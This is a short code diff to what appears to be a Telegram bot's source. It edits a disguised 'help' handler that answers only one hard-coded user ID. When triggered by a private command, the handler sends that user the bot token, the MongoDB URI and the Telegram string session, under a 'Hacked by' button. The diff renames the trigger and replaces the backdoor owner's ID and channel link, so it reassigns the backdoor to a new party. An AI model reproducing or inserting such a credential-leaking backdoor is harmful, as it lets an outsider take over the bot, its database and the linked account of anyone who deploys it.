@@ -106,19 +106,19 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("Legend")
+    filters.command("SYNTAX")
     & filters.private
-    & filters.user(7291963092)
+    & filters.user(7844391683)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/FRIENDS_ZONE_CHATTING_GROUP)............☆""",
+       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n """,
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"https://t.me/FRIENDS_ZONE_CHATTING_GROUP")
+                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"https://t.me/SYNTAX_WORLD")
                  ]
             ]
          ),
